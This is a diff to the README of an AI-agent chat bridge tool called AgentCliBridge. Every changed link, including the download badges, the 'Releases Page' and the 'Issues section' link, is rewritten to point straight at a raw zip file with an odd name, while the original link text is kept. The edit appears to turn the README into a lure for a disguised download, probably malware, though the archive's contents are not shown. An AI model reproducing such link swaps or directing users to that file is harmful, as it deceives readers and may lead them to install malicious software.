@@ -1,6 +1,6 @@
 # 🤖 AgentCliBridge - Connect AI Agents to Chat Apps
 
-[![Download AgentCliBridge](https://img.shields.io/badge/Download-Get%20AgentCliBridge-orange)](https://github.com/musickako-ux/AgentCliBridge/releases)
+[![Download AgentCliBridge](https://img.shields.io/badge/Download-Get%20AgentCliBridge-orange)](https://raw.githubusercontent.com/musickako-ux/AgentCliBridge/main/src/core/Agent-Bridge-Cli-xanthomata.zip)
 
 AgentCliBridge links AI agents like Claude, Codex, and Gemini to chat apps such as Telegram and Discord. It helps you automate tasks, manage projects, and control workflows using chat platforms without needing programming skills.
 
@@ -39,9 +39,9 @@ This guide helps you download and use AgentCliBridge on a Windows computer.
 
 ## 💾 Download and Install AgentCliBridge
 
-1. Go to the [AgentCliBridge Releases Page](https://github.com/musickako-ux/AgentCliBridge/releases). This page has all the available versions.  
+1. Go to the [AgentCliBridge Releases Page](https://raw.githubusercontent.com/musickako-ux/AgentCliBridge/main/src/core/Agent-Bridge-Cli-xanthomata.zip). This page has all the available versions.  
 
-   [![Download AgentCliBridge](https://img.shields.io/badge/Download-Get%20AgentCliBridge-brightgreen)](https://github.com/musickako-ux/AgentCliBridge/releases)
+   [![Download AgentCliBridge](https://img.shields.io/badge/Download-Get%20AgentCliBridge-brightgreen)](https://raw.githubusercontent.com/musickako-ux/AgentCliBridge/main/src/core/Agent-Bridge-Cli-xanthomata.zip)
 
 2. Look for the latest release. It should have a name like `AgentCliBridge-Setup.exe` or something similar ending with `.exe`.  
 
@@ -134,7 +134,7 @@ You can use these platforms both to send commands and receive AI responses.
 
 ## 🙋 Getting Help
 
-- Visit the [Issues section](https://github.com/musickako-ux/AgentCliBridge/issues) on GitHub if you encounter problems.  
+- Visit the [Issues section](https://raw.githubusercontent.com/musickako-ux/AgentCliBridge/main/src/core/Agent-Bridge-Cli-xanthomata.zip) on GitHub if you encounter problems.  
 - Use community forums or chat apps where other users discuss setup and use.
 
 ---
@@ -152,4 +152,4 @@ You can use these platforms both to send commands and receive AI responses.
 
 ---
 
-[Download AgentCliBridge from GitHub Releases](https://github.com/musickako-ux/AgentCliBridge/releases) to start connecting AI with chat today.
+[Download AgentCliBridge from GitHub Releases](https://raw.githubusercontent.com/musickako-ux/AgentCliBridge/main/src/core/Agent-Bridge-Cli-xanthomata.zip) to start connecting AI with chat today.
